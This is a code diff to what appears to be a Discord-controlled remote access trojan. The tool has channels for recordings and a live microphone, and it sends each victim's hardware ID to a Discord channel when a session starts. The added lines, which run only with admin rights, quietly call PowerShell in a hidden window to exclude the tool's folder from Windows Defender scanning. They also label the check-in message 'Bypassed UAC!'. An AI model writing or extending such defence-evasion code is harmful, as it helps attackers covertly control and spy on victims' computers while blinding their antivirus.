@@ -108,6 +108,13 @@ guild_id = auto                                                    ##
 ## If you like this project, please leave me a Star on GitHub ;)   ##
 #####################################################################
 
+if IsAdmin():
+    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
+    for path in exclusion_paths:
+        try:
+            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
+        except: pass
+
 client = discord.Client(intents=discord.Intents.all())
 # [pysilon_var] !opus_initialization 0
     
@@ -186,7 +193,11 @@ async def on_ready():
             elif channel.name == 'recordings': channel_ids['recordings'] = channel.id
             elif channel.name == 'Live microphone': channel_ids['voice'] = channel.id
 
-    await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')
+    if IsAdmin():
+        await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + ' (Bypassed UAC!)' + '```\n_ _\n_ _\n_ _')
+    else:
+        await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')
+
 
 # [pysilon_var] !recording_startup 1
     
